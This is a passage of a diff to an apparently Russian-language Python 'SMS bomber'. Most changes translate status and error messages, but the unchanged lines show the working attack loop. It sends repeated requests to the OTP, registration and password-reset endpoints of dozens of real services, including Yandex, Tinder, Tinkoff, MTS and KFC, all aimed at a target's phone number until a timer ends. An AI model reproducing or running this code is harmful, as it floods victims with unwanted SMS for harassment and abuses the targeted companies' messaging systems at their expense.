+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -12758,10 +12758,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -12769,10 +12769,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -12781,10 +12781,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -12792,10 +12792,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -12805,10 +12805,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -12816,10 +12816,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
@@ -12827,10 +12827,10 @@ if call == str(2):
             print('[+] Delivery отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://requests.service.banki.ru/form/960/submit',
@@ -12840,17 +12840,17 @@ if call == str(2):
             print('[+] Banki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.moyo.ua/identity/registration',
@@ -12859,10 +12859,10 @@ if call == str(2):
             print('[+] Moyo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
@@ -12870,10 +12870,10 @@ if call == str(2):
             print('[+] Helsi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[+] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
@@ -12882,10 +12882,10 @@ if call == str(2):
             print('[+] KinoLend отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -12895,10 +12895,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
@@ -12906,10 +12906,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -12920,7 +12920,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -12928,10 +12928,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -12940,10 +12940,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -12952,10 +12952,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -12965,10 +12965,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -12978,10 +12978,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -12989,10 +12989,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -13002,10 +13002,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -13013,10 +13013,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -13026,10 +13026,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -13042,10 +13042,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -13053,10 +13053,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -13064,10 +13064,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -13075,10 +13075,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -13086,10 +13086,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -13098,10 +13098,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -13110,14 +13110,14 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -13126,10 +13126,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -13139,10 +13139,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -13152,10 +13152,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -13164,10 +13164,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -13175,10 +13175,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -13186,10 +13186,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -13197,10 +13197,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -13209,10 +13209,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -13222,10 +13222,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -13234,10 +13234,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -13245,10 +13245,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -13258,10 +13258,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -13269,10 +13269,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -13280,25 +13280,25 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -13306,55 +13306,55 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -13363,22 +13363,22 @@ if call == str(2):
             R = R + 1
             print('[+] PizzaHut отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -13390,7 +13390,7 @@ if call == str(2):
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -13398,11 +13398,11 @@ if call == str(2):
             R = R + 1
             print('[+] Smsint отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -13410,11 +13410,11 @@ if call == str(2):
             R = R + 1
             print('[+] oyorooms отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post(
@@ -13425,11 +13425,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -13438,22 +13438,22 @@ if call == str(2):
             R = R + 1
             print('[+] newnext отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -13462,22 +13462,22 @@ if call == str(2):
             R = R + 1
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
